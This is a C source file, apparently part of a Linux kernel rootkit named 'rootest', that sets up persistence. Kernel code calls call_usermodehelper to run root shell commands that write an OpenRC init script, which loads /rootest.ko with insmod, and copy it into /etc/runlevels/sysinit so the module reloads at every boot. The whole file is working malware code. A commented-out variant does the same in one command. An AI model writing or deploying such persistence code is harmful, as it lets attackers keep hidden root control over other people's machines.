#include "rootest.h"

void persistence_runlevels(void)
{
    //char *command = "echo -e \'#!/sbin/openrc-run\n\ndepend() {\n\tneed modules\n}\n\nstart() {\n\tebegin \"Loading mon_module\"\n\t/sbin/insmod /rootest.ko\n\teend \$?\n}\' > /etc/init.d/rootest && chmod +x /etc/init.d/rootest && cp /etc/init.d/rootest /etc/runlevels/sysinit/";
    //char *argv[] = { "/bin/sh", "-c", command, NULL };
    //static char *envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
    //call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

    static char *envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
    
    char *argv1[] = { "/bin/sh", "-c", "touch /etc/init.d/rootest && chmod +x /etc/init.d/rootest", NULL };
    call_usermodehelper(argv1[0], argv1, envp, UMH_WAIT_PROC);

    char *argv2[] = { "/bin/sh", "-c", "echo '#!/sbin/openrc-run' > /etc/init.d/rootest", NULL };
    call_usermodehelper(argv2[0], argv2, envp, UMH_WAIT_PROC);

    char *argv3[] = { "/bin/sh", "-c", "echo 'depend() {\nneed modules\n}' >> /etc/init.d/rootest", NULL };
    call_usermodehelper(argv3[0], argv3, envp, UMH_WAIT_PROC);

    char *argv4[] = { "/bin/sh", "-c", "echo 'start() {\n/sbin/insmod /rootest.ko\n}' >> /etc/init.d/rootest", NULL };
    call_usermodehelper(argv4[0], argv4, envp, UMH_WAIT_PROC);
    
    char *argv5[] = { "/bin/sh", "-c", "cp /etc/init.d/rootest /etc/runlevels/sysinit/", NULL };
    call_usermodehelper(argv5[0], argv5, envp, UMH_WAIT_PROC);
    
    printk(KERN_INFO "rootkit: persistence on");
}
